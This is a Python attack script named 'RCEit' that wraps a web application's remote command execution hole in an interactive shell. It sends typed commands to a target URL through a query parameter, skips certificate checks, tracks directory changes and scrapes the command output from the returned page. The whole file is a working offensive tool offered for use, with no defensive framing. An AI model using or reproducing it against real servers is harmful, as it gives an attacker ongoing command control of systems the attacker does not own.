import requests
from bs4 import BeautifulSoup
from lxml import etree
import argparse 
import sys
from termcolor import colored
INFO  = lambda x : colored(x , 'green')
DANGER = lambda x : colored(x , 'red')
banner ="""
 /$$$$$$$   /$$$$$$  /$$$$$$$$ /$$   /$$                /$$        /$$$$$$ 
| $$__  $$ /$$__  $$| $$_____/|__/  | $$              /$$$$       /$$$_  $$
| $$  \ $$| $$  \__/| $$       /$$ /$$$$$$ /$$    /$$|_  $$      | $$$$\ $$
| $$$$$$$/| $$      | $$$$$   | $$|_  $$_/|  $$  /$$/  | $$      | $$ $$ $$
| $$__  $$| $$      | $$__/   | $$  | $$   \  $$/$$/   | $$      | $$\ $$$$
| $$  \ $$| $$    $$| $$      | $$  | $$ /$$\  $$$/    | $$      | $$ \ $$$
| $$  | $$|  $$$$$$/| $$$$$$$$| $$  |  $$$$/ \  $/    /$$$$$$ /$$|  $$$$$$/
|__/  |__/ \______/ |________/|__/   \___/    \_/    |______/|__/ \______/ by:ayoub-2
"""

class Shell : 
    def __init__(self , url , parm , path) :
        self.HEADERS  = {
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.66',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        self.url  = url
        self.parm = parm
        self.path  = path
        self.shell()

    def get_result( self , command , home=None):
        if not home : 
            home = ''
        else : 
            home  = 'cd '+ home + ';' 
        payload = {self.parm:home +  command}
        try : 
            response = requests.get(self.url, headers=self.HEADERS, params=payload, verify=False )
        except  requests.exceptions.MissingSchema as e : 
            print( "Error URL with no schema , Exiting")
            exit()
        except requests.exceptions.ConnectionError  : 
            return "Connection error"
        except requests.exceptions.RequestException : 
            return "Timed out"
        finally: 
            if self.path : 
                soup = BeautifulSoup(response.content, "html.parser") 
                dom = etree.HTML(str(soup))
                return dom.xpath(self.path)[0].text
            else : 
                return response.text

    def shell(self ) : 
        HOME = self.get_result("pwd")
        HOME=HOME.strip()
        while True : 
            command  = input(HOME + "$ ") 
            if command.strip()=="exit" : 
                exit()
            if "setcd" in command or 'cd' == command.strip().split(" ")[0] : 
                nhome = command.split(" ")[1]
                if '.' in nhome or ".." in nhome or '/' != nhome[0] : 
                    nhome = HOME +'/'+ nhome
                    HOME = self.get_result('pwd' , nhome)
                    HOME = HOME.strip()
            print(self.get_result(command , HOME))





def main(): 
    global banner 
    print(banner)
    parser = argparse.ArgumentParser(description='RCE to web Shell' , prog="RCEit", add_help=False)
    parser.add_argument('url', metavar='url', type=str , nargs='?', help='Url of the target')
    parser.add_argument('-p' , '--parametre', metavar='param', type=str , nargs='?' , help='parametre leading to rce , defaull cmd' )
    parser.add_argument('-x' , '--xpath', metavar='path', type=str , nargs='?' , help='The xpath including the result of a command' )
    parser.add_argument('-h','--help', action='store_true', help='show this help message and exit')
    parser.usage = parser.format_help()
    args=parser.parse_args()
    if len(sys.argv) < 2:
        parser.print_usage()
        sys.exit(1)
    if not args.url : 
        print(parser.usage)
        sys.exit()
    if not args.xpath : 
        print(INFO("[+] use the website as it is" ))
    if not args.parametre :
        print(INFO("[+] using default parametre"))
        parm = 'cmd'
    else : 
        parm = args.parametre
    if args.help : 
        print(parser.usage)
    Shell(args.url , parm , args.xpath)


if __name__ == "__main__": 
    main()